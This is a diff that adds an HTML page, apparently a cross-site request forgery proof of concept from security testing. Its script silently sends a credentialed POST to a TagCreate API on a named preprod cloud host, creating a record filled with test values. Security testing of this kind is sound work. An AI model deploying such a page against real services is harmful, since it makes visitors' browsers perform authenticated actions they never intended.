@@ -1,0 +1,14 @@
+<html>
+<head>
+</head>
+<body>
+    <script>
+	var xhr = new XMLHttpRequest();
+	xhr.onreadystatechange = function () { /* .. */ };
+	xhr.open("POST", "https://security-validation-j5bnghhv-ev-approuter-emobility-preprod-cpo.cfapps.eu10.hana.ondemand.com/backend/client/api/TagCreate", false);
+	xhr.setRequestHeader("Content-Type", "application/json");
+	xhr.withCredentials = true;
+	xhr.send(JSON.stringify({"auth_id":"SECTEST2","visual_number":"test2","user_id":"UID12367","user_name":"test3","user_surname":"test4","user_email":"test12@sap.com","concur_user_id":"","description":"","active":true}));
+	</script>
+</body>
+</html>	
